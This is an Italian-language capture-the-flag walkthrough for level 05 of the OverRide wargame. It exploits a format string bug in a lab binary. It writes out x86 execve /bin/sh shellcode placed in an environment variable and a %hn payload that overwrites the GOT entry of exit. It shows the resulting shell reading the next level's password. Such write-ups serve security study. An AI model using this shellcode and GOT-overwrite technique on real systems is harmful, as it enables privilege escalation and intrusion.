# Level 05
Analizziamo il binario con `gdb`:
```
level05@OverRide:~$ gdb -q level05
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  exit
0x08048370  exit@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```

### Funzione `main`
Tramite `fgets` viene memorizzato un input per poi esser stampato successivamente
da `printf`.

### Soluzione
Come prima cosa dobbiamo capire quanti specificatori ci servono per raggiungere
la stringa:
```
level05@OverRide:~$ echo `python -c 'print "%x . "*20'` | ./level05
64 . f7fcfac0 . f7ec3add . ffffd69f . ffffd69e . 0 . ffffffff . ffffd724 . f7fdb000 . 2e207825 . 20782520 . 7825202e . 25202e20 . 202e2078 . 2e207825 . 20782520 . 7825202e . 25202e20 . 202e2078 . 2e207825 .
```
al decimo abbiamo l'inizio della stringa.
Ora dobbiamo trovare l'indirizzo nella GOT della funzione `exit` che è presente subito
dopo `printf` così da sostituirla con l'indirizzo di uno shellcode che inseriremo
nell'env:
```
level05@OverRide:~$ objdump -R level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
```
Adesso inseriamo lo shellcode nell'env:
```
level05@OverRide:~$ export SHELLCODE=$(python -c 'print "\x90"*36 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80"')
```
e cerchiamo l'indirizzo in cui verrà caricato nella memoria:
```
level05@OverRide:~$ gdb -q level05
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) r
Starting program: /home/users/level05/level05

Breakpoint 1, 0x08048449 in main ()
(gdb) x /x getenv("SHELLCODE")
0xffffd8a7:     0x90909090
```
aggiungiamo a `0xffffd8a7` `36 byte` così da raggiungere direttamente il codice e avremo
l'indirizzo: `0xffffd8cb`.
Dunque dobbiamo scrivere all'indirizzo `0x080497e0` il numero `0xffffd8cb`
quindi dividiamo il numero in due parti e calcoliamo i numeri da dover scrivere
nell'exploit per scrivere 2 byte alla volta con printf:
```
d8cb = 55496 - 8 = 55491
ffff = 65535 - 0xd8cb = 10036
```
quindi avremo:
```
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55491d%10$hn" + "%10036d%11$hn"' > /tmp/exploit1
```
```
level05@OverRide:~$ export SHELLCODE=$(python -c 'print "\x90"*36 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80"')
level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55491d%10$hn" + "%10036d%11$hn"' > /tmp/exploit1
level05@OverRide:~$ cat /tmp/exploit1 - | ./level05
��
134415680
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
exit
exit
level05@OverRide:~$ su level06
Password: h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level06/level06
level06@OverRide:~$
```